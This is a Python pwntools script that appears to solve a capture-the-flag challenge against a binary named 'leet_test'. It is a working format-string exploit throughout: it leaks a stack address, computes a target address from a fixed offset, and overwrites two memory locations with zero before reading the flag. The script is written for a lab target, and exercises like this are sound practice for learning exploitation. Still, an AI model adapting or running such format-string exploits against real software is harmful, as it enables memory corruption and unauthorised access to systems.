from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *0x4013a7
continue
'''.format(**locals())

def send_payload(payload):
    io.sendline(payload)
    io.recvuntil('Hello,')
    return io.recvline()

# Set up pwntools for the correct architecture
exe = './leet_test'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
warnings.filterwarnings('ignore')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

io.recvuntil('Please enter your name: ')
io.sendline('%{}$p'.format(1))
io.recvuntil('Hello,')
leak = int(io.recvlineS().strip(), 16)
info("Leaked address 0x%x", leak)
random_addr = leak + 8488
info("Random address 0x%x", random_addr)

format_string.write(random_addr, 0x0)
format_string.write(0x404078, 0x0)
format_string.execute_writes()

flag = io.recvline()
success(flag)
